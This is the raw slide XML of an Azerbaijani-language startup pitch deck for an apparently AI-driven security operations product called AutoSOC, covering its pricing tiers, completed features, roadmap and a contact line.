            <a:ext cx="2941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/ PCI / GDPR audit izi — artıq mövcud büdcə xətti.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4937760"/>
            <a:ext cx="34229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MSSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5532120"/>
            <a:ext cx="3422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yüzlərlə son nöqtə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245864" y="4937760"/>
            <a:ext cx="34229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AZ·RU·EN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4245864" y="5532120"/>
            <a:ext cx="3422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üstünlük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7943088" y="4937760"/>
            <a:ext cx="34229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dəqiqələr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943088" y="5532120"/>
            <a:ext cx="3422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dəyərə çatma vaxtı</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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7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MODELI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Pulsuz başla, son nöqtə üzrə böyü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532888" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3971"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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404872"/>
            <a:ext cx="20756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862072"/>
            <a:ext cx="2075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DD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Pulsuz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520440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Skan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977640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Anti-fişinq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4434840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Dashboard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01568" y="2148840"/>
            <a:ext cx="2532888" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3971"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="13233C"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="2B7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0168" y="2404872"/>
            <a:ext cx="20756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30168" y="2862072"/>
            <a:ext cx="2075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7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€3–6 / son nöqtə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30168" y="3520440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Agentlər + loglar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30168" y="3977640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Aşkarlama &amp; cavab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30168" y="4434840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Bildirişlər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54496" y="2148840"/>
            <a:ext cx="2532888" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3971"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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3096" y="2404872"/>
            <a:ext cx="20756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MSSP / DC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83096" y="2862072"/>
            <a:ext cx="2075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DD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€200–1000 / tenant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83096" y="3520440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Multi-tenant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83096" y="3977640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Brendli hesabatlar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83096" y="4434840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SLA + API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107424" y="2148840"/>
            <a:ext cx="2532888" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3971"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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36024" y="2404872"/>
            <a:ext cx="20756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Əlavələr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36024" y="2862072"/>
            <a:ext cx="2075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DD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Uyğunluq · Sİ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36024" y="3520440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ISO/PCI/GDPR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336024" y="3977640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İdarəolunan Sİ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336024" y="4434840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Threat-intel feed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56235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Başlanğıcda məcburi abunə yoxdur — platformalarda ödənişli təqdim et.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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7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NAILIYYƏT &amp; YOL XƏRITƏSI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Təməl hazırdır. Növbəti — enterprise açarı.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362956" cy="3474720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2895"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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2395728"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805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25466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423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DD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Hazırdır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3383280"/>
            <a:ext cx="47228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SOC konsolu, agentlər, aşkarlama mühərriki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14400" y="3886200"/>
            <a:ext cx="47228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Anti-fişinq, təcrid, RBAC + invite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14400" y="4389120"/>
            <a:ext cx="47228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Paketlənmiş quraşdırıcılar (.deb / .exe)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14400" y="4892040"/>
            <a:ext cx="47228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145 avtomat test — hamısı yaşıl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277356" y="2194560"/>
            <a:ext cx="5362956" cy="3474720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2895"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="20344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24244" y="2395728"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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546604"/>
            <a:ext cx="301752" cy="3017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37476" y="2423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7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Növbəti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6643116" y="3383280"/>
            <a:ext cx="47228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Multi-tenancy → MSSP kanalı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643116" y="3886200"/>
            <a:ext cx="47228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Uyğunluq hesabatları (ISO/PCI/GDPR)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643116" y="4389120"/>
            <a:ext cx="47228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Sİ insident köməkçisi (avto-korrelyasiya)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6643116" y="4892040"/>
            <a:ext cx="47228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SSO / SOC 2 — enterprise üçün</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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E2540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0C223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7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ÇAĞIRIŞ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SOC-u olmayan hər kəs üçün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quraq.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7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Sİ-əsaslı  ·  çoxdilli  ·  hamısı bir yerdə  ·  sürətli  ·  sərfəli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937760"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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7492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4937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və tərəfdaşlıq üçün:  security@autosoc.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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AutoSOC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AutoSOC</dc:creator>
  <cp:lastModifiedBy>AutoSOC</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-07-16T22:37:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-16T22:37:47Z</dcterms:modified>
</cp:coreProperties>
</file>